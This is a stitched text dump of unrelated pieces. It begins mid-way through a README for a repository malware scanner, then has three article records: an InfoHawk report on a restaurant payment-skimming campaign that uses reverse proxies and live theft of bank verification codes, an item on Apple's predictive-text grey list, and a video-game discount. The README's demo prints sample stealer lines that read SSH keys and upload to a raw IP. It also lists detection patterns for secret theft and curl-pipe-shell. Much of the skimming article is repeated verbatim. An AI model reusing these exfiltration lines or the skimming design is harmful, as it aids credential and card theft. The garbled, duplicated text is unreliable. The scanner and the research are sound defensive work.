cloneguard ./some-folder                               # shorthand for scan
cloneguard scan --json ./some-folder                   # machine-readable output
clone runs git clone (which downloads files but does not execute project code) into
a folder named after the repo, or into [dir] if you give one, then scans it.
Other commands: cloneguard help, cloneguard version.
Flags go before the path.
This makes it easy to use in scripts or a git hook, e.g.
cloneguard scan . || exit 1.
Scanning the bundled demo/ folder, which contains a fake stealer and an auto-run
VS Code task:
$ cloneguard scan --no-color demo
 DANGEROUS  Do not run or install anything from this project.
1 critical, 2 high, 1 medium, 0 low
[CRITICAL] util.js:1  Reaches for your secrets AND talks to a suspicious server
[HIGH] .vscode/tasks.json:1  Runs a command the moment you open the folder
[HIGH] util.js:1  Touches your SSH keys
    > readFile("~/.ssh/id_rsa");
[MEDIUM] util.js:2  Connects to a raw IP address
    > fetch("http://203.0.113.7:8080/upload");
Each finding shows the file and line, the offending snippet, and a plain-English explanation of why it matters. (Output above is abbreviated.)
With --json the result has this shape:
{
  "root": "demo",
  "files_scanned": 2,
  "files_skipped": 0,
  "findings": [
    { "rule": "reads-ssh-keys", "title": "Touches your SSH keys",
      "severity": "high", "file": "util.js", "line": 1,
      "snippet": "...", "why": "..." }
  ],
  "verdict": "dangerous"
}
- Secret theft: code that reaches for SSH keys, cloud credentials (AWS, GCP, Azure, Kubernetes, Docker, npm, Git), shell history, browser passwords, wallets, or dumps all environment variables
- Suspicious network use: connections to raw IPs, webhook/paste/request-catcher drop-off sites (Discord webhooks, Telegram bots, pastebin, webhook.site, ...), public tunnel services, or base64-hidden URLs
- Download-and-run: code that downloads or decodes text and then executes it
(eval, new Function, curl | sh)
- Auto-run hooks: npm install scripts, .vscode/tasks.json tasks that run when the
folder is opened, risky setup.py
- Obfuscation: scrambled code such as _0x identifiers, hex escapes, or code hidden
behind long runs of whitespace
- Compiled binaries (.exe, .dll, .so, .dylib, .node, ...) checked into the repo
- Dangerous combinations in one file, such as reading keys AND talking to a suspicious server, which is escalated to critical
- Walks the folder, skipping .git, node_modules, __pycache__, .venv and venv (unless --include-deps), plus files over the size limit.
- Classifies each file as code, config, docs, lockfile or binary, and applies only the rules that make sense for that kind (docs and lockfiles are ignored for text rules).
- Runs line-by-line regex rules and per-file checks (for example parsing
package.json for install hooks).
- Combines findings: if one file has hits from multiple risky categories (credentials, network, dynamic execution, obfuscation), it raises a combined finding.
- Picks a verdict from the worst severity found (see exit codes above).
"No red flags found" is not proof of safety. It only means none of these common tricks were spotted. cloneguard is pattern-based, so determined attackers can evade it, and it can produce false positives on legitimate code (a password manager should touch browser data). For code from strangers, still use a throwaway VM or container.
go test ./...
Layout:
- cmd/cloneguard/main.go: CLI, flags and clone handling
- internal/scanner/rules.go: line-level detection rules (ID, severity, regex, explanation)
- internal/scanner/filechecks.go: per-file checks (package.json hooks, tasks.json, setup.py, binaries)
- internal/scanner/scanner.go: directory walk, file classification, verdict logic
- internal/report/report.go: human-readable text output
- demo/: a deliberately malicious sample for trying the tool
To add a detection, append a rule to lineRules in rules.go with an id, title,
severity, category, scope, regex and a plain-English why, then add a test in
internal/scanner/scanner_test.go.
MIT. See LICENSE.

articles.title: Restaurant Delivery Payment-Skimming Campaign
articles.body:
When customers order food online, they expect a familiar experience: find
    their restaurant, choose their meal, and pay. Increasingly, criminals are
    exploiting that familiarity by creating convincing clones of restaurant
    ordering websites, right down to the original site's underlying code.
  
    In early November 2026, InfoHawk researchers investigated a collection of
    suspicious websites that appear to be part of one or more coordinated
    restaurant impersonation and payment-skimming operations.
  
    Across two research passes, we identified 820 domains impersonating 35
    restaurant brands. Of those, 808 use the .delivery top-level
    domain, and the rest use .com or .shop.
  
    The scale is concerning, but what makes these sites particularly dangerous
    is how convincing they can be.
  
These aren't ordinary fake websites
    The investigation began with a suspicious domain:
    mlckessejersstey[.]delivery.
  
    The site impersonated Jersey Mike's, the popular sandwich chain, and
    reproduced its online ordering experience.
  
    Rather than simply displaying a crude imitation of the restaurant's website,
    the attackers used a more sophisticated approach: reverse-proxying the
    legitimate site while replacing the checkout payment form with a malicious
    one.
  
    A reverse proxy can retrieve content from a legitimate website and present
    it to visitors under a different domain. This allows an attacker-controlled
    site to display genuine pages and assets while selectively modifying the
    parts of the experience that matter to the attacker.
  
    In this case, the malicious checkout requested credit card information and
    also asked customers for the SMS verification code sent by their bank.
  
    This is a particularly dangerous combination. Capturing a credit card number
    is valuable to criminals; obtaining a one-time verification code could also
    help them authorize fraudulent transactions, depending on how the victim's
    bank uses that code.
  
    For consumers, the experience can appear nearly indistinguishable from
    ordering directly from the restaurant. The site looks familiar, the menu and
    ordering flow can behave normally, and the fraudulent payment form appears
    at the moment a customer expects to pay.
  
    Importantly, this does not require the legitimate restaurant's website to
    have been hacked. The attackers can operate on infrastructure they control
    while using the authentic restaurant website as the source of the content
    they display.
  
How the attack works
    Each clone is a reverse proxy: a server that sits between the victim
    and the real restaurant site, fetches every page from the real site as it is
    requested, edits it on the way through, and passes it on. Menus, prices,
    store hours, and the cart are live and correct, because they come from the
    real site. Only the payment step is replaced. Described from
    mlckessejersstey[.]delivery (Jersey Mike's); we believe the clones of the
    other brands run the same kit.
  
    - 
        The victim arrives from a search ad 
          A Google Search ad imitates the restaurant's listing and shows a
          look-alike domain. The domain is behind Cloudflare, so its real server
          is hidden, and Cloudflare gives it a valid certificate automatically
          (Google Trust Services here), so the browser shows "Connection is
          secure".
        
- 
        Every page is fetched live from the real site 
          The proxy forwards each request to the restaurant's own servers,
          adjusting the host name and cookies, and relays the answer. The real
          site's headers come through (on Jersey Mike's,
          x-powered-by: Nuxt and Amazon CloudFront headers), which
          is how we could tell which paths came from the real site and which
          from the scammer's server.
- 
        Addresses are rewritten to keep the victim on the fake domain 
          The proxy replaces the brand's own host names in pages, scripts, and
          redirects with the fake domain, and maps each backend to a path on it,
          such as /__bapi__/ or /__payments__/. Store
          lookup, menus, login, and cart all work, because those calls go back
          through the proxy to the real APIs. Even the brand's own bot-detection
          script still runs, with its endpoints rewritten.
- 
        Three scripts are injected into every page 
          A script blocker patches
          HTMLScriptElement.prototype.src so that listed scripts
          never load (on Jersey Mike's, the OneTrust cookie banner and Branch,
          which could send phone users to the app or the real domain). _jmu() finds the real checkout payment frame and
          points it at /js/index.html on the fake domain; a
          MutationObserver puts the fake one back whenever the page restores the
          real one. _chkT() reads the order total from the
          "Place order" button every half second and saves it, so the fake form
          shows the right amount.
- 
        The card form is the scammer's 
          A few paths are answered by the scammer's server instead of the real
          site: /js/* (the card form and its scripts) and /payment/socket.io. The form looks like part of checkout.
          On submit it collects every field (card number, expiry, CVV, name,
          phone) and sends it, with the site name, to the operator over a live
          socket.io connection.
- 
        An operator gets past the bank's check live 
          We believe a person watching a control panel uses the card elsewhere
          and, when the bank challenges that payment, tells the victim's page
          what to show next: "card declined, try another", a page asking for the
          SMS code (/js/confirmation/), an "approve in your bank
          app" page (/js/app/), or "invalid code, try again". We
          believe the code the victim types is what lets the operator's charge
          through 3-D Secure.
- 
        The victim is sent away 
          When the operator marks it a success, the page sets a cookie
          valid=77777 lasting until 2038 and sends the victim to
          another chain's real site
          (href.li/?https://www.jimmyjohns.com/; href.li hides
          where they came from). No order reaches the restaurant: the real
          payment step never runs, so there is no confirmation email and no
          food. We believe the victim's card is then charged for whatever the
          operator bought.
    Why this design. The clone never goes out of date, the victim builds
    a real order with a real total before anything looks wrong, and one kit
    works against any restaurant by changing the target site, the domain, and a
    few path rules. The scammer's server does very little work, which makes it
    cheap to move. Some variants skip the payment wording and only pin the
    frame's address, re-setting it every time the page changes it.
  
Distribution of the Delivery Scam
    Searching Google's ad archive (Ads Transparency Center) for the domains in
    our first sweep found at least 47 Google Search text ads between July
    7, 2026, and October 20, 2026, run under
    at least 46 separate advertiser accounts with at least 43 different,
    unrelated-looking business names (construction firms, a reptile rescue, a
    watch company). The ads below are a sub-sample: we searched only for the
    domains in our first sweep, so there are likely more. Each ad imitates a
    restaurant's search listing and shows a look-alike domain. Most ran for 1–4
    days, usually starting days after the domain was registered.
  
    Status: On November 4, 2026, 367 of the 820 domains still served a
    site, so they could be getting traffic through means other than ads. None of
    the ads below were still running on November 3, 2026, but this scam may also
    be running through other ads, or other means. Google's public Ads
    Transparency pages now show "Can't find ad" for the creatives and "No ads
    found" for the domains we checked, which suggests Google has taken them
    down; the "Ads Transparency page" links below will likely not load. The
    images and text here come from InfoHawk's own capture of Google's archive,
    made on or before November 3, 2026. Of the 47 ads below, 41 have Google's
    rendered image; the rest show the text from Google's ad preview. Domains in
    the image ads were read from the image and may contain small reading errors.
  
    
      Jimmy John's20Jul 7 – Sep 18
    
  
    
      Firehouse Subs12Jul 28 – Sep 30
    
  
    
      Dave's Hot Chicken11Aug 18 – Oct 20
    
  
    
      Jersey Mike's4Jul 21 – Jul 31

    reproduced its online ordering experience.

    the attackers used a more sophisticated approach: reverse-proxying the
    legitimate site while replacing the checkout payment form with a malicious
    one.
  
    A reverse proxy can retrieve content from a legitimate website and present
    it to visitors under a different domain. This allows an attacker-controlled
    site to display genuine pages and assets while selectively modifying the
    parts of the experience that matter to the attacker.
  
    In this case, the malicious checkout requested credit card information and
    also asked customers for the SMS verification code sent by their bank.
  
    This is a particularly dangerous combination. Capturing a credit card number
    is valuable to criminals; obtaining a one-time verification code could also
    help them authorize fraudulent transactions, depending on how the victim's
    bank uses that code.
  
    For consumers, the experience can appear nearly indistinguishable from
    ordering directly from the restaurant. The site looks familiar, the menu and
    ordering flow can behave normally, and the fraudulent payment form appears
    at the moment a customer expects to pay.
  
    Importantly, this does not require the legitimate restaurant's website to
    have been hacked. The attackers can operate on infrastructure they control
    while using the authentic restaurant website as the source of the content
    they display.
  
How the attack works
    Each clone is a reverse proxy: a server that sits between the victim
    and the real restaurant site, fetches every page from the real site as it is
    requested, edits it on the way through, and passes it on. Menus, prices,
    store hours, and the cart are live and correct, because they come from the
    real site. Only the payment step is replaced. Described from
    mlckessejersstey[.]delivery (Jersey Mike's); we believe the clones of the
    other brands run the same kit.
  
    - 
        The victim arrives from a search ad 
          A Google Search ad imitates the restaurant's listing and shows a
          look-alike domain. The domain is behind Cloudflare, so its real server
          is hidden, and Cloudflare gives it a valid certificate automatically
          (Google Trust Services here), so the browser shows "Connection is
          secure".
        
- 
        Every page is fetched live from the real site 
          The proxy forwards each request to the restaurant's own servers,
          adjusting the host name and cookies, and relays the answer. The real
          site's headers come through (on Jersey Mike's,
          x-powered-by: Nuxt and Amazon CloudFront headers), which
          is how we could tell which paths came from the real site and which
          from the scammer's server.
- 
        Addresses are rewritten to keep the victim on the fake domain 
          The proxy replaces the brand's own host names in pages, scripts, and
          redirects with the fake domain, and maps each backend to a path on it,
          such as /__bapi__/ or /__payments__/. Store
          lookup, menus, login, and cart all work, because those calls go back
          through the proxy to the real APIs. Even the brand's own bot-detection
          script still runs, with its endpoints rewritten.
- 
        Three scripts are injected into every page 
          A script blocker patches
          HTMLScriptElement.prototype.src so that listed scripts
          never load (on Jersey Mike's, the OneTrust cookie banner and Branch,
          which could send phone users to the app or the real domain). _jmu() finds the real checkout payment frame and
          points it at /js/index.html on the fake domain; a
          MutationObserver puts the fake one back whenever the page restores the
          real one. _chkT() reads the order total from the
          "Place order" button every half second and saves it, so the fake form
          shows the right amount.
- 
        The card form is the scammer's 
          A few paths are answered by the scammer's server instead of the real
          site: /js/* (the card form and its scripts) and /payment/socket.io. The form looks like part of checkout.
          On submit it collects every field (card number, expiry, CVV, name,
          phone) and sends it, with the site name, to the operator over a live
          socket.io connection.
- 
        An operator gets past the bank's check live 
          We believe a person watching a control panel uses the card elsewhere
          and, when the bank challenges that payment, tells the victim's page
          what to show next: "card declined, try another", a page asking for the
          SMS code (/js/confirmation/), an "approve in your bank
          app" page (/js/app/), or "invalid code, try again". We
          believe the code the victim types is what lets the operator's charge
          through 3-D Secure.
- 
        The victim is sent away 
          When the operator marks it a success, the page sets a cookie
          valid=77777 lasting until 2038 and sends the victim to
          another chain's real site
          (href.li/?https://www.jimmyjohns.com/; href.li hides
          where they came from). No order reaches the restaurant: the real
          payment step never runs, so there is no confirmation email and no
          food. We believe the victim's card is then charged for whatever the
          operator bought.
    Why this design. The clone never goes out of date, the victim builds
    a real order with a real total before anything looks wrong, and one kit
    works against any restaurant by changing the target site, the domain, and a
    few path rules. The scammer's server does very little work, which makes it
    cheap to move. Some variants skip the payment wording and only pin the
    frame's address, re-setting it every time the page changes it.
  
Distribution of the Delivery Scam
    Searching Google's ad archive (Ads Transparency Center) for the domains in
    our first sweep found at least 47 Google Search text ads between July
    7, 2026, and October 20, 2026, run under
    at least 46 separate advertiser accounts with at least 43 different,
    unrelated-looking business names (construction firms, a reptile rescue, a
    watch company). The ads below are a sub-sample: we searched only for the
    domains in our first sweep, so there are likely more. Each ad imitates a
    restaurant's search listing and shows a look-alike domain. Most ran for 1–4
    days, usually starting days after the domain was registered.
  
    Status: On November 4, 2026, 367 of the 820 domains still served a
    site, so they could be getting traffic through means other than ads. None of
    the ads below were still running on November 3, 2026, but this scam may also
    be running through other ads, or other means. Google's public Ads
    Transparency pages now show "Can't find ad" for the creatives and "No ads
    found" for the domains we checked, which suggests Google has taken them
    down; the "Ads Transparency page" links below will likely not load. The
    images and text here come from InfoHawk's own capture of Google's archive,
    made on or before November 3, 2026. Of the 47 ads below, 41 have Google's
    rendered image; the rest show the text from Google's ad preview. Domains in
    the image ads were read from the image and may contain small reading errors.
  
    
      Jimmy John's20Jul 7 – Sep 18
    
  
    
      Firehouse Subs12Jul 28 – Sep 30
    
  
    
      Dave's Hot Chicken11Aug 18 – Oct 20
    
  
    
      Jersey Mike's4Jul 21 – Jul 31

articles.title: Apple Keyboard has a blacklist of phrases you can't swipe
articles.body:
“Australia is a very bad place to question your sexuality on MDMA with NSA spies” might be a text you would wish to send to your friends, if you have had an extraordinarily complicated night out in Sydney.
But your iPhone won’t help you spell any of it if you try to swipe-type it – that is, by gliding a finger across a keyboard as opposed to pecking out a word.
New research shows that Apple has a “grey list” of more than 100,000 words and phrases that it has restricted from being completed by its predictive text.
So if a user wishes to type phrases such as “Dictator Trump”, “NSA spies” or, surprisingly, “Australia is a very bad place”, “question your sexuality” or “on MDMA”, they will have to spell them out.
Apple’s predictive text will not suggest these words. And, if a user attempts to swipe-type them, they will often stumble, changing “United Ireland” to “United Iceland”, for example, or “Tibetan independence” to “Tibetan independences”.
The “grey list” was discovered by the independent researcher Derik Kauffman, whose other projects include using AI to find errors in scientific papers. After noticing that he had problems typing certain phrases – but not others – on his iPhone, Kauffman was able to unearth a table containing the list, encoded in Apple’s operating system.
The list he found includes some unsurprising words and phrases. Apple’s iPhone will not autocomplete references to drugs, sexual acts and, perhaps in the spirit of corporate protection, “iMessage isn’t working”.
But it also includes possibly politically charged phrases, which Kauffman described to Reuters as a “light-touch form of censorship”. Among these are “Trayvon Martin”, the name of the Black teenager shot in Florida in 2012, “Kashmir dispute”, “Muslim extremist” and “male chauvinist pig”.
In Hebrew, Apple will not autocomplete the phrase “the occupied territories”. In Arabic, it will not autocomplete the phrase “the Hamas movement”.
The list is one more glimpse into the dark bowels of how autocorrect – the chirpy keyboard partner that helps you look more educated to your loved ones – actually works.
The technology has taken many forms. In its earliest version, Unix, an operating system, would look up each word a user typed against a table of words, to determine if this word was spelled correctly.
This evolved into n-grams, a tool which allows an operating system to statistically predict what words might come next, based on the words before it. These form the basis of Apple’s familiar autocorrect, which was known to change expletives into prudish alternatives: “fork” and “ducking”, among other gaffes.
Last year, Apple launched a new autocorrect – a “transformer-based” system that was more akin to an LLM. Reddit sleuths saw this as a possible reason behind a spate of avant-garde spelling suggestions their iPhones made last year.
This hard-coded list illuminates one longstanding mystery behind the world’s spelling coach. Others remain, such as a brief glitch in which users of the dictation feature saw the name “Trump” flash across their screen when they spoke the word “racist” into their iPhones – which Apple quickly remedied.
Apple said that it designed its keyboard to avoid offering inappropriate or offensive predictive suggestions. It said iPhone users could always type out specific words or phrases, and override predictive text suggestions to achieve their desired meaning.

articles.title: Costco members can get $5 off the reimagined Ocarina of Time
articles.body:
While some retailers were offering preorder discounts on the remastered Legend of Zelda: The Ocarina of Time, it’s not too late to save if you missed out. Costco members can currently get $5 off the digital version online, bringing the price down to $54.99. Considering an annual Costco membership runs $65, that discount almost offsets one month of your plan — a prime example of “gamer math.”
Costco members can get $5 off the reimagined Ocarina of Time
Nintendo has lovingly updated the legendary ’98 title with new visuals, modern mechanics, and on-demand jumping.
My colleague Andrew Webster recently shared his thoughts on Nintendo’s latest Switch 2 exclusive, noting how impressed he was with how much impact a few modern quality-of-life changes had on what is otherwise a classic experience. The updated graphics are as thoughtful as they are beautiful, pairing realistic scenery with puppet-like characters. Perhaps, more importantly, Link can now jump anytime he likes, rather than being limited to specific ledges.
